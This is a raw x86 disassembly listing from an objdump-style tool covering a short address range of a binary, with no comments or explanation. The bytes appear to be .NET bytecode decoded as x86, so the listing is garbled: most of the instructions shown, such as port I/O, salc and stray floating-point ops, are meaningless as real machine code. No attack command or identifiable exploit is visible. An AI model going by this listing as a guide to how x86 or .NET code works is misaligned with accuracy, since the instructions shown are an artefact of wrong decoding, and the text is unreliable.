  402b77:	6c                   	insb   (%dx),%es:(%edi)
  402b78:	23 00                	and    (%eax),%eax
  402b7a:	00 00                	add    %al,(%eax)
  402b7c:	00 00                	add    %al,(%eax)
  402b7e:	00 30                	add    %dh,(%eax)
  402b80:	41                   	inc    %ecx
  402b81:	5b                   	pop    %ebx
  402b82:	13 04 12             	adc    (%edx,%edx,1),%eax
  402b85:	04 28                	add    $0x28,%al
  402b87:	67 00 00             	add    %al,(%bx,%si)
  402b8a:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402b8d:	1a 08                	sbb    (%eax),%cl
  402b8f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b90:	5a                   	pop    %edx
  402b91:	00 00                	add    %al,(%eax)
  402b93:	0a 1a                	or     (%edx),%bl
  402b95:	da 6f 68             	fisubrl 0x68(%edi)
  402b98:	00 00                	add    %al,(%eax)
  402b9a:	0a 72 87             	or     -0x79(%edx),%dh
  402b9d:	03 00                	add    (%eax),%eax
  402b9f:	70 28                	jo     0x402bc9
  402ba1:	42                   	inc    %edx
  402ba2:	00 00                	add    %al,(%eax)
  402ba4:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402ba7:	0a de                	or     %dh,%bl
  402ba9:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  402bae:	22 00                	and    (%eax),%al
  402bb0:	00 0a                	add    %cl,(%edx)
  402bb2:	0d 72 27 02 00       	or     $0x22772,%eax
  402bb7:	70 0a                	jo     0x402bc3
  402bb9:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402bbc:	00 0a                	add    %cl,(%edx)
  402bbe:	de 07                	fiadds (%edi)
  402bc0:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402bc3:	00 0a                	add    %cl,(%edx)
  402bc5:	de 00                	fiadds (%eax)
  402bc7:	06                   	push   %es
  402bc8:	2a 00                	sub    (%eax),%al
  402bca:	00 00                	add    %al,(%eax)
  402bcc:	01 10                	add    %edx,(%eax)
  402bce:	00 00                	add    %al,(%eax)
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	9c                   	pushf
  402bd5:	9c                   	pushf
  402bd6:	00 1b                	add    %bl,(%ebx)
  402bd8:	25 00 00 01 1b       	and    $0x1b010000,%eax
  402bdd:	30 08                	xor    %cl,(%eax)
  402bdf:	00 c5                	add    %al,%ch
  402be1:	01 00                	add    %eax,(%eax)
  402be3:	00 17                	add    %dl,(%edi)
  402be5:	00 00                	add    %al,(%eax)
  402be7:	11 7e 0f             	adc    %edi,0xf(%esi)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	04 2d                	add    $0x2d,%al
  402bee:	05 38 b8 01 00       	add    $0x1b838,%eax
  402bf3:	00 7e 10             	add    %bh,0x10(%esi)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	04 02                	add    $0x2,%al
  402bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  402bfb:	69 00 00 0a 0a 06    	imul   $0x60a0a00,(%eax),%eax
  402c01:	16                   	push   %ss
  402c02:	3e 56                	ds push %esi
  402c04:	01 00                	add    %eax,(%eax)
  402c06:	00 7e 11             	add    %bh,0x11(%esi)
  402c09:	00 00                	add    %al,(%eax)
  402c0b:	04 15                	add    $0x15,%al
  402c0d:	6a 40                	push   $0x40
  402c0f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402c10:	00 00                	add    %al,(%eax)
  402c12:	00 7e 12             	add    %bh,0x12(%esi)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	04 16                	add    $0x16,%al
  402c19:	91                   	xchg   %eax,%ecx
  402c1a:	16                   	push   %ss
  402c1b:	40                   	inc    %eax
  402c1c:	83 00 00             	addl   $0x0,(%eax)
  402c1f:	00 7e 13             	add    %bh,0x13(%esi)
  402c22:	00 00                	add    %al,(%eax)
  402c24:	04 6f                	add    $0x6f,%al
  402c26:	6a 00                	push   $0x0
  402c28:	00 0a                	add    %cl,(%edx)
  402c2a:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402c2e:	06                   	push   %es
  402c2f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402c32:	00 0a                	add    %cl,(%edx)
  402c34:	80 11 00             	adcb   $0x0,(%ecx)
  402c37:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c3a:	13 00                	adc    (%eax),%eax
  402c3c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402c3f:	6c                   	insb   (%dx),%es:(%edi)
  402c40:	00 00                	add    %al,(%eax)
  402c42:	0a 73 33             	or     0x33(%ebx),%dh
  402c45:	00 00                	add    %al,(%eax)
  402c47:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
  402c4d:	7e 11                	jle    0x402c60
  402c4f:	00 00                	add    %al,(%eax)
  402c51:	04 16                	add    $0x16,%al
  402c53:	6a 33                	push   $0x33
  402c55:	36 15 6a 80 11 00    	ss adc $0x11806a,%eax
  402c5b:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c5e:	10 00                	adc    %al,(%eax)
  402c60:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c63:	12 00                	adc    (%eax),%al
  402c65:	00 04 16             	add    %al,(%esi,%edx,1)
  402c68:	7e 12                	jle    0x402c7c
  402c6a:	00 00                	add    %al,(%eax)
  402c6c:	04 8e                	add    $0x8e,%al
  402c6e:	b7 16                	mov    $0x16,%bh
  402c70:	14 fe                	adc    $0xfe,%al
  402c72:	06                   	push   %es
  402c73:	23 00                	and    (%eax),%eax
  402c75:	00 06                	add    %al,(%esi)
  402c77:	73 37                	jae    0x402cb0
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 7e 10             	or     0x10(%esi),%bh
  402c7e:	00 00                	add    %al,(%eax)
  402c80:	04 6f                	add    $0x6f,%al
  402c82:	38 00                	cmp    %al,(%eax)
  402c84:	00 0a                	add    %cl,(%edx)
  402c86:	26 dd 20             	frstor %es:(%eax)
  402c89:	01 00                	add    %eax,(%eax)
  402c8b:	00 7e 11             	add    %bh,0x11(%esi)
  402c8e:	00 00                	add    %al,(%eax)
  402c90:	04 17                	add    $0x17,%al
  402c92:	6a da                	push   $0xffffffda
  402c94:	b7 17                	mov    $0x17,%bh
  402c96:	d6                   	salc
  402c97:	8d 33                	lea    (%ebx),%esi
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	01 80 12 00 00 04    	add    %eax,0x4000012(%eax)
  402ca1:	2b 11                	sub    (%ecx),%edx
  402ca3:	7e 13                	jle    0x402cb8
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	04 7e                	add    $0x7e,%al
  402ca9:	12 00                	adc    (%eax),%al
  402cab:	00 04 16             	add    %al,(%esi,%edx,1)
  402cae:	91                   	xchg   %eax,%ecx
  402caf:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb0:	6d                   	insl   (%dx),%es:(%edi)
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	0a 38                	or     (%eax),%bh
  402cb5:	a2 00 00 00 7e       	mov    %al,0x7e000000
  402cba:	13 00                	adc    (%eax),%eax
  402cbc:	00 04 7e             	add    %al,(%esi,%edi,2)
  402cbf:	12 00                	adc    (%eax),%al
  402cc1:	00 04 16             	add    %al,(%esi,%edx,1)
  402cc4:	06                   	push   %es
  402cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc6:	6e                   	outsb  %ds:(%esi),(%dx)
  402cc7:	00 00                	add    %al,(%eax)
  402cc9:	0a 7e 13             	or     0x13(%esi),%bh
  402ccc:	00 00                	add    %al,(%eax)
  402cce:	04 6f                	add    $0x6f,%al
  402cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd1:	00 00                	add    %al,(%eax)
  402cd3:	0a 7e 11             	or     0x11(%esi),%bh
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	04 33                	add    $0x33,%al
  402cda:	60                   	pusha
  402cdb:	14 fe                	adc    $0xfe,%al
  402cdd:	06                   	push   %es
  402cde:	2b 00                	sub    (%eax),%eax
  402ce0:	00 06                	add    %al,(%esi)
  402ce2:	73 70                	jae    0x402d54
  402ce4:	00 00                	add    %al,(%eax)
  402ce6:	0a 73 71             	or     0x71(%ebx),%dh
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	0a 0b                	or     (%ebx),%cl
  402ced:	07                   	pop    %es
  402cee:	14 72                	adc    $0x72,%al
  402cf0:	8f 03                	pop    (%ebx)
  402cf2:	00 70 17             	add    %dh,0x17(%eax)
  402cf5:	8d 03                	lea    (%ebx),%eax
  402cf7:	00 00                	add    %al,(%eax)
  402cf9:	01 0d 09 16 7e 13    	add    %ecx,0x137e1609
  402cff:	00 00                	add    %al,(%eax)
  402d01:	04 6f                	add    $0x6f,%al
  402d03:	6a 00                	push   $0x0
  402d05:	00 0a                	add    %cl,(%edx)
  402d07:	a2 09 14 14 14       	mov    %al,0x14141409
  402d0c:	17                   	pop    %ss
  402d0d:	28 72 00             	sub    %dh,0x0(%edx)
  402d10:	00 0a                	add    %cl,(%edx)
  402d12:	26 15 6a 80 11 00    	es adc $0x11806a,%eax
  402d18:	00 04 7e             	add    %al,(%esi,%edi,2)
  402d1b:	13 00                	adc    (%eax),%eax
  402d1d:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402d20:	6c                   	insb   (%dx),%es:(%edi)
  402d21:	00 00                	add    %al,(%eax)
  402d23:	0a 73 33             	or     0x33(%ebx),%dh
  402d26:	00 00                	add    %al,(%eax)
  402d28:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
  402d2e:	17                   	pop    %ss
  402d2f:	8d 33                	lea    (%ebx),%esi
  402d31:	00 00                	add    %al,(%eax)
  402d33:	01 80 12 00 00 04    	add    %eax,0x4000012(%eax)
  402d39:	2b 20                	sub    (%eax),%esp
  402d3b:	7e 11                	jle    0x402d4e
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	04 7e                	add    $0x7e,%al
  402d41:	13 00                	adc    (%eax),%eax
  402d43:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402d46:	6f                   	outsl  %ds:(%esi),(%dx)
  402d47:	00 00                	add    %al,(%eax)
  402d49:	0a da                	or     %dl,%bl
  402d4b:	17                   	pop    %ss
  402d4c:	6a da                	push   $0xffffffda
  402d4e:	b7 17                	mov    $0x17,%bh
  402d50:	d6                   	salc
  402d51:	8d 33                	lea    (%ebx),%esi
  402d53:	00 00                	add    %al,(%eax)
  402d55:	01 80 12 00 00 04    	add    %eax,0x4000012(%eax)
  402d5b:	2b 08                	sub    (%eax),%ecx
  402d5d:	16                   	push   %ss
  402d5e:	80 0f 00             	orb    $0x0,(%edi)
  402d61:	00 04 de             	add    %al,(%esi,%ebx,8)
  402d64:	47                   	inc    %edi
  402d65:	7e 10                	jle    0x402d77
  402d67:	00 00                	add    %al,(%eax)
  402d69:	04 7e                	add    $0x7e,%al
  402d6b:	12 00                	adc    (%eax),%al
  402d6d:	00 04 16             	add    %al,(%esi,%edx,1)
  402d70:	7e 12                	jle    0x402d84
  402d72:	00 00                	add    %al,(%eax)
  402d74:	04 8e                	add    $0x8e,%al
  402d76:	b7 16                	mov    $0x16,%bh
  402d78:	14 fe                	adc    $0xfe,%al
  402d7a:	06                   	push   %es
  402d7b:	23 00                	and    (%eax),%eax
  402d7d:	00 06                	add    %al,(%esi)
  402d7f:	73 37                	jae    0x402db8
  402d81:	00 00                	add    %al,(%eax)
  402d83:	0a 7e 10             	or     0x10(%esi),%bh
  402d86:	00 00                	add    %al,(%eax)
  402d88:	04 6f                	add    $0x6f,%al
  402d8a:	38 00                	cmp    %al,(%eax)
  402d8c:	00 0a                	add    %cl,(%edx)
  402d8e:	26 de 1b             	ficomps %es:(%ebx)
  402d91:	25 28 22 00 00       	and    $0x2228,%eax
  402d96:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402d99:	80 0f 00             	orb    $0x0,(%edi)
  402d9c:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d9f:	24 00                	and    $0x0,%al
  402da1:	00 0a                	add    %cl,(%edx)
  402da3:	de 07                	fiadds (%edi)
  402da5:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402da8:	00 0a                	add    %cl,(%edx)
  402daa:	de 00                	fiadds (%eax)
  402dac:	2a 00                	sub    (%eax),%al
  402dae:	00 00                	add    %al,(%eax)
  402db0:	41                   	inc    %ecx
  402db1:	1c 00                	sbb    $0x0,%al
  402db3:	00 00                	add    %al,(%eax)
  402db5:	00 00                	add    %al,(%eax)
  402db7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	9d                   	popf
  402dbd:	01 00                	add    %eax,(%eax)
  402dbf:	00 a9 01 00 00 1b    	add    %ch,0x1b000001(%ecx)
  402dc5:	00 00                	add    %al,(%eax)
  402dc7:	00 25 00 00 01 1b    	add    %ah,0x1b010000
  402dcd:	30 02                	xor    %al,(%edx)
  402dcf:	00 17                	add    %dl,(%edi)
  402dd1:	00 00                	add    %al,(%eax)
  402dd3:	00 18                	add    %bl,(%eax)
  402dd5:	00 00                	add    %al,(%eax)
  402dd7:	11 02                	adc    %eax,(%edx)
  402dd9:	28 2d 00 00 06 de    	sub    %ch,0xde060000
  402ddf:	0e                   	push   %cs
  402de0:	25 28 22 00 00       	and    $0x2228,%eax
  402de5:	0a 0a                	or     (%edx),%cl
  402de7:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402dea:	00 0a                	add    %cl,(%edx)
  402dec:	de 00                	fiadds (%eax)
  402dee:	2a 00                	sub    (%eax),%al
  402df0:	01 10                	add    %edx,(%eax)
  402df2:	00 00                	add    %al,(%eax)
  402df4:	00 00                	add    %al,(%eax)
  402df6:	00 00                	add    %al,(%eax)
  402df8:	08 08                	or     %cl,(%eax)
  402dfa:	00 0e                	add    %cl,(%esi)
  402dfc:	25 00 00 01 1b       	and    $0x1b010000,%eax
  402e01:	30 07                	xor    %al,(%edi)
  402e03:	00 c9                	add    %cl,%cl
  402e05:	00 00                	add    %al,(%eax)
  402e07:	00 19                	add    %bl,(%ecx)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	11 7e 16             	adc    %edi,0x16(%esi)
  402e0e:	00 00                	add    %al,(%eax)
  402e10:	04 13                	add    $0x13,%al
  402e12:	04 11                	add    $0x11,%al
  402e14:	04 28                	add    $0x28,%al
  402e16:	73 00                	jae    0x402e18
  402e18:	00 0a                	add    %cl,(%edx)
  402e1a:	16                   	push   %ss
  402e1b:	13 05 11 04 12 05    	adc    0x5120411,%eax
  402e21:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402e25:	0a 7e 0f             	or     0xf(%esi),%bh
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	04 39                	add    $0x39,%al
  402e2c:	96                   	xchg   %eax,%esi
  402e2d:	00 00                	add    %al,(%eax)
  402e2f:	00 73 33             	add    %dh,0x33(%ebx)
  402e32:	00 00                	add    %al,(%eax)
  402e34:	0a 0a                	or     (%edx),%cl
  402e36:	02 28                	add    (%eax),%ch
  402e38:	4b                   	dec    %ebx
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	06                   	push   %es
  402e3c:	28 53 00             	sub    %dl,0x0(%ebx)
  402e3f:	00 06                	add    %al,(%esi)
  402e41:	0b 07                	or     (%edi),%eax
  402e43:	8e b7 28 75 00 00    	mov    0x7528(%edi),%?
  402e49:	0a 72 9b             	or     -0x65(%edx),%dh
  402e4c:	03 00                	add    (%eax),%eax
  402e4e:	70 28                	jo     0x402e78
  402e50:	42                   	inc    %edx
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 28                	or     (%eax),%ch
  402e55:	4b                   	dec    %ebx
  402e56:	00 00                	add    %al,(%eax)
  402e58:	06                   	push   %es
  402e59:	0c 06                	or     $0x6,%al
  402e5b:	08 16                	or     %dl,(%esi)
  402e5d:	08 8e b7 6f 6e 00    	or     %cl,0x6e6fb7(%esi)
  402e63:	00 0a                	add    %cl,(%edx)
  402e65:	06                   	push   %es
  402e66:	07                   	pop    %es
  402e67:	16                   	push   %ss
  402e68:	07                   	pop    %es
  402e69:	8e b7 6f 6e 00 00    	mov    0x6e6f(%edi),%?
  402e6f:	0a 7e 10             	or     0x10(%esi),%bh
  402e72:	00 00                	add    %al,(%eax)
  402e74:	04 15                	add    $0x15,%al
  402e76:	17                   	pop    %ss
  402e77:	6f                   	outsl  %ds:(%esi),(%dx)
  402e78:	76 00                	jbe    0x402e7a
  402e7a:	00 0a                	add    %cl,(%edx)
  402e7c:	26 7e 10             	es jle 0x402e8f
  402e7f:	00 00                	add    %al,(%eax)
  402e81:	04 06                	add    $0x6,%al
  402e83:	6f                   	outsl  %ds:(%esi),(%dx)
  402e84:	6a 00                	push   $0x0
  402e86:	00 0a                	add    %cl,(%edx)
  402e88:	16                   	push   %ss
  402e89:	06                   	push   %es
  402e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8c:	00 00                	add    %al,(%eax)
  402e8e:	0a b7 16 14 fe 06    	or     0x6fe1416(%edi),%dh
  402e94:	26 00 00             	add    %al,%es:(%eax)
  402e97:	06                   	push   %es
  402e98:	73 37                	jae    0x402ed1
  402e9a:	00 00                	add    %al,(%eax)
  402e9c:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e9f:	77 00                	ja     0x402ea1
  402ea1:	00 0a                	add    %cl,(%edx)
  402ea3:	26 de 0a             	fimuls %es:(%edx)
  402ea6:	06                   	push   %es
  402ea7:	2c 06                	sub    $0x6,%al
  402ea9:	06                   	push   %es
  402eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  402eab:	58                   	pop    %eax
  402eac:	00 00                	add    %al,(%eax)
  402eae:	0a dc                	or     %ah,%bl
  402eb0:	de 14 25 28 22 00 00 	ficoms 0x2228(,%eiz,1)
  402eb7:	0a 0d 16 80 0f 00    	or     0xf8016,%cl
  402ebd:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ec0:	24 00                	and    $0x0,%al
  402ec2:	00 0a                	add    %cl,(%edx)
  402ec4:	de 00                	fiadds (%eax)
  402ec6:	de 0c 11             	fimuls (%ecx,%edx,1)
  402ec9:	05 2c 07 11 04       	add    $0x411072c,%eax
  402ece:	28 78 00             	sub    %bh,0x0(%eax)
  402ed1:	00 0a                	add    %cl,(%edx)
  402ed3:	dc 2a                	fsubrl (%edx)
  402ed5:	00 00                	add    %al,(%eax)
  402ed7:	00 01                	add    %al,(%ecx)
  402ed9:	28 00                	sub    %al,(%eax)
  402edb:	00 02                	add    %al,(%edx)
  402edd:	00 2a                	add    %ch,(%edx)
  402edf:	00 70 9a             	add    %dh,-0x66(%eax)
  402ee2:	00 0a                	add    %cl,(%edx)
  402ee4:	00 00                	add    %al,(%eax)
  402ee6:	00 00                	add    %al,(%eax)
  402ee8:	00 00                	add    %al,(%eax)
  402eea:	24 00                	and    $0x0,%al
  402eec:	82 a6 00 14 25 00 00 	andb   $0x0,0x251400(%esi)
  402ef3:	01 02                	add    %eax,(%edx)
  402ef5:	00 11                	add    %dl,(%ecx)
  402ef7:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	00 1b                	add    %bl,(%ebx)
  402f01:	30 02                	xor    %al,(%edx)
  402f03:	00 23                	add    %ah,(%ebx)
  402f05:	00 00                	add    %al,(%eax)
  402f07:	00 1a                	add    %bl,(%edx)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	11 7e 10             	adc    %edi,0x10(%esi)
  402f0e:	00 00                	add    %al,(%eax)
  402f10:	04 02                	add    $0x2,%al
  402f12:	6f                   	outsl  %ds:(%esi),(%dx)
  402f13:	79 00                	jns    0x402f15
  402f15:	00 0a                	add    %cl,(%edx)
  402f17:	26 de 14 25 28 22 00 	ficoms %es:0x2228(,%eiz,1)
  402f1e:	00 
  402f1f:	0a 0a                	or     (%edx),%cl
  402f21:	16                   	push   %ss
  402f22:	80 0f 00             	orb    $0x0,(%edi)
  402f25:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f28:	24 00                	and    $0x0,%al
  402f2a:	00 0a                	add    %cl,(%edx)
  402f2c:	de 00                	fiadds (%eax)
  402f2e:	2a 00                	sub    (%eax),%al
  402f30:	01 10                	add    %edx,(%eax)
  402f32:	00 00                	add    %al,(%eax)
  402f34:	00 00                	add    %al,(%eax)
  402f36:	00 00                	add    %al,(%eax)
  402f38:	0e                   	push   %cs
  402f39:	0e                   	push   %cs
  402f3a:	00 14 25 00 00 01 1b 	add    %dl,0x1b010000(,%eiz,1)
  402f41:	30 02                	xor    %al,(%edx)
  402f43:	00 b6 00 00 00 1b    	add    %dh,0x1b000000(%esi)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	11 7e 14             	adc    %edi,0x14(%esi)
  402f4e:	00 00                	add    %al,(%eax)
  402f50:	04 2c                	add    $0x2c,%al
  402f52:	20 7e 14             	and    %bh,0x14(%esi)
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 6f                	add    $0x6f,%al
  402f59:	7a 00                	jp     0x402f5b
  402f5b:	00 0a                	add    %cl,(%edx)
  402f5d:	14 80                	adc    $0x80,%al
  402f5f:	14 00                	adc    $0x0,%al
  402f61:	00 04 de             	add    %al,(%esi,%ebx,8)
  402f64:	0e                   	push   %cs
  402f65:	25 28 22 00 00       	and    $0x2228,%eax
  402f6a:	0a 0a                	or     (%edx),%cl
  402f6c:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402f6f:	00 0a                	add    %cl,(%edx)
  402f71:	de 00                	fiadds (%eax)
  402f73:	7e 17                	jle    0x402f8c
  402f75:	00 00                	add    %al,(%eax)
  402f77:	04 2c                	add    $0x2c,%al
  402f79:	20 7e 17             	and    %bh,0x17(%esi)
  402f7c:	00 00                	add    %al,(%eax)
  402f7e:	04 6f                	add    $0x6f,%al
  402f80:	7a 00                	jp     0x402f82
  402f82:	00 0a                	add    %cl,(%edx)
  402f84:	14 80                	adc    $0x80,%al
  402f86:	17                   	pop    %ss
  402f87:	00 00                	add    %al,(%eax)
  402f89:	04 de                	add    $0xde,%al
  402f8b:	0e                   	push   %cs
  402f8c:	25 28 22 00 00       	and    $0x2228,%eax
  402f91:	0a 0b                	or     (%ebx),%cl
  402f93:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402f96:	00 0a                	add    %cl,(%edx)
  402f98:	de 00                	fiadds (%eax)
  402f9a:	7e 13                	jle    0x402faf
  402f9c:	00 00                	add    %al,(%eax)
  402f9e:	04 2c                	add    $0x2c,%al
  402fa0:	2a 7e 13             	sub    0x13(%esi),%bh
  402fa3:	00 00                	add    %al,(%eax)
  402fa5:	04 6f                	add    $0x6f,%al
  402fa7:	7b 00                	jnp    0x402fa9
  402fa9:	00 0a                	add    %cl,(%edx)
  402fab:	7e 13                	jle    0x402fc0
  402fad:	00 00                	add    %al,(%eax)
  402faf:	04 6f                	add    $0x6f,%al
  402fb1:	6c                   	insb   (%dx),%es:(%edi)
  402fb2:	00 00                	add    %al,(%eax)
  402fb4:	0a 14 80             	or     (%eax,%eax,4),%dl
  402fb7:	13 00                	adc    (%eax),%eax
  402fb9:	00 04 de             	add    %al,(%esi,%ebx,8)
  402fbc:	0e                   	push   %cs
  402fbd:	25 28 22 00 00       	and    $0x2228,%eax
  402fc2:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402fc5:	24 00                	and    $0x0,%al
  402fc7:	00 0a                	add    %cl,(%edx)
  402fc9:	de 00                	fiadds (%eax)
  402fcb:	7e 10                	jle    0x402fdd
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	04 2c                	add    $0x2c,%al
  402fd1:	2a 7e 10             	sub    0x10(%esi),%bh
  402fd4:	00 00                	add    %al,(%eax)
  402fd6:	04 6f                	add    $0x6f,%al
  402fd8:	7c 00                	jl     0x402fda
  402fda:	00 0a                	add    %cl,(%edx)
  402fdc:	7e 10                	jle    0x402fee
  402fde:	00 00                	add    %al,(%eax)
  402fe0:	04 6f                	add    $0x6f,%al
  402fe2:	7d 00                	jge    0x402fe4
  402fe4:	00 0a                	add    %cl,(%edx)
  402fe6:	14 80                	adc    $0x80,%al
  402fe8:	10 00                	adc    %al,(%eax)
  402fea:	00 04 de             	add    %al,(%esi,%ebx,8)
  402fed:	0e                   	push   %cs
  402fee:	25 28 22 00 00       	and    $0x2228,%eax
  402ff3:	0a 0d 28 24 00 00    	or     0x2428,%cl
  402ff9:	0a de                	or     %dh,%bl
  402ffb:	00 28                	add    %ch,(%eax)
  402ffd:	7e 00                	jle    0x402fff
  402fff:	00 0a                	add    %cl,(%edx)
  403001:	2a 00                	sub    (%eax),%al
  403003:	00 01                	add    %al,(%ecx)
  403005:	34 00                	xor    $0x0,%al
  403007:	00 00                	add    %al,(%eax)
  403009:	00 07                	add    %al,(%edi)
  40300b:	00 12                	add    %dl,(%edx)
  40300d:	19 00                	sbb    %eax,(%eax)
  40300f:	0e                   	push   %cs
  403010:	25 00 00 01 00       	and    $0x10000,%eax
  403015:	00 2e                	add    %ch,(%esi)
  403017:	00 12                	add    %dl,(%edx)
  403019:	40                   	inc    %eax
  40301a:	00 0e                	add    %cl,(%esi)
  40301c:	25 00 00 01 00       	and    $0x10000,%eax
  403021:	00 55 00             	add    %dl,0x0(%ebp)
  403024:	1c 71                	sbb    $0x71,%al
  403026:	00 0e                	add    %cl,(%esi)
  403028:	25 00 00 01 00       	and    $0x10000,%eax
  40302d:	00 86 00 1c a2 00    	add    %al,0xa21c00(%esi)
  403033:	0e                   	push   %cs
  403034:	25 00 00 01 1b       	and    $0x1b010000,%eax
  403039:	30 02                	xor    %al,(%edx)
  40303b:	00 29                	add    %ch,(%ecx)
  40303d:	00 00                	add    %al,(%eax)
  40303f:	00 00                	add    %al,(%eax)
  403041:	00 00                	add    %al,(%eax)
  403043:	00 7e 19             	add    %bh,0x19(%esi)
  403046:	00 00                	add    %al,(%eax)
  403048:	04 2c                	add    $0x2c,%al
  40304a:	13 7e 0f             	adc    0xf(%esi),%edi
  40304d:	00 00                	add    %al,(%eax)
  40304f:	04 2c                	add    $0x2c,%al
  403051:	0c 7e                	or     $0x7e,%al
  403053:	18 00                	sbb    %al,(%eax)
  403055:	00 04 17             	add    %al,(%edi,%edx,1)
  403058:	d6                   	salc
  403059:	80 18 00             	sbbb   $0x0,(%eax)
  40305c:	00 04 de             	add    %al,(%esi,%ebx,8)
  40305f:	0c 28                	or     $0x28,%al
  403061:	22 00                	and    (%eax),%al
  403063:	00 0a                	add    %cl,(%edx)
  403065:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403068:	00 0a                	add    %cl,(%edx)
  40306a:	de 00                	fiadds (%eax)
  40306c:	2a 00                	sub    (%eax),%al
  40306e:	00 00                	add    %al,(%eax)
  403070:	01 10                	add    %edx,(%eax)
  403072:	00 00                	add    %al,(%eax)
  403074:	00 00                	add    %al,(%eax)
  403076:	00 00                	add    %al,(%eax)
  403078:	1c 1c                	sbb    $0x1c,%al
  40307a:	00 0c 25 00 00 01 1b 	add    %cl,0x1b010000(,%eiz,1)
  403081:	30 03                	xor    %al,(%ebx)
  403083:	00 5d 00             	add    %bl,0x0(%ebp)
  403086:	00 00                	add    %al,(%eax)
  403088:	1c 00                	sbb    $0x0,%al
  40308a:	00 11                	add    %dl,(%ecx)
  40308c:	7e 0f                	jle    0x40309d
  40308e:	00 00                	add    %al,(%eax)
  403090:	04 2c                	add    $0x2c,%al
  403092:	45                   	inc    %ebp
  403093:	1b 8d 2d 00 00 01    	sbb    0x100002d(%ebp),%ecx
  403099:	0b 07                	or     (%edi),%eax
  40309b:	16                   	push   %ss
  40309c:	72 9f                	jb     0x40303d
  40309e:	03 00                	add    (%eax),%eax
  4030a0:	70 a2                	jo     0x403044
  4030a2:	07                   	pop    %es
  4030a3:	17                   	pop    %ss
  4030a4:	7e 0a                	jle    0x4030b0
  4030a6:	00 00                	add    %al,(%eax)
  4030a8:	04 a2                	add    $0xa2,%al
  4030aa:	07                   	pop    %es
  4030ab:	18 28                	sbb    %ch,(%eax)
  4030ad:	4a                   	dec    %edx
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	06                   	push   %es
  4030b1:	a2 07 19 7e 0a       	mov    %al,0xa7e1907
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	04 a2                	add    $0xa2,%al
  4030ba:	07                   	pop    %es
  4030bb:	1a 7e 28             	sbb    0x28(%esi),%bh
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	04 a2                	add    $0xa2,%al
  4030c2:	07                   	pop    %es
  4030c3:	28 7f 00             	sub    %bh,0x0(%edi)
  4030c6:	00 0a                	add    %cl,(%edx)
  4030c8:	28 25 00 00 06 17    	sub    %ah,0x17060000
  4030ce:	80 19 00             	sbbb   $0x0,(%ecx)
  4030d1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4030d4:	7e 00                	jle    0x4030d6
  4030d6:	00 0a                	add    %cl,(%edx)
  4030d8:	de 0e                	fimuls (%esi)
  4030da:	25 28 22 00 00       	and    $0x2228,%eax
  4030df:	0a 0a                	or     (%edx),%cl
  4030e1:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4030e4:	00 0a                	add    %cl,(%edx)
  4030e6:	de 00                	fiadds (%eax)
  4030e8:	2a 00                	sub    (%eax),%al
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	01 10                	add    %edx,(%eax)
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	00 00                	add    %al,(%eax)
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	4e                   	dec    %esi
  4030f5:	4e                   	dec    %esi
